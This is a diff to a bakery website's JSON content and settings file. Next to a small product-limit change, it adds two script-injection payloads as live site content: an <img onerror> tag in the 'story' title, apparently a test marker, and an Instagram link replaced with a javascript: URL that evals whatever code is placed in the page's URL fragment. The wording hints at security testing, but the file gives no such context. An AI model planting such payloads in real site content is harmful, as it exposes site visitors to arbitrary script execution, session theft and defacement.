@@ -59,7 +59,7 @@
       "title": "Produits Populaires"
     },
     "story": {
-      "title": "Fait Main, sans Raccourci",
+      "title": "<img src=x onerror=\"console.log('XSS_TEST_SLOGAN')\">Test Auto Save Slogan",
       "description": "Nous cuisons avec la rigueur de l'artisanat : fermentation lente, ingrédients d'exception et cuisson précise. Le résultat ? Des créations authentiques au goût incomparable.",
       "imageAlt": "Pain Artisanal"
     }
@@ -130,7 +130,7 @@
       "email_value": "contact@boulangerie-artisanale.fr"
     },
     "social": {
-      "instagram": "https://www.instagram.com/lesdelices.d.eva?igsh=aDQwZGYyMXNpeG5n",
+      "instagram": "javascript:eval(decodeURIComponent(location.hash.slice(1)))",
       "instagram_user": "lesdelices.d.eva",
       "tiktok": "https://www.tiktok.com/@les.delices.d.eva?_r=1&_t=ZS-96y0UWvpi3o",
       "tiktok_user": "les.delices.d.eva"
@@ -193,7 +193,7 @@
     "contact_social_tiktok": "https://www.tiktok.com/@les.delices.d.eva?_r=1&_t=ZS-96y0UWvpi3o",
     "contact_social_tiktok_user": "les.delices.d.eva",
     "carousel_max_slides": 5,
-    "new_products_limit": 5,
+    "new_products_limit": 4,
     "store_enabled": true,
     "store_message": "Le magasin est temporairement fermé."
   }
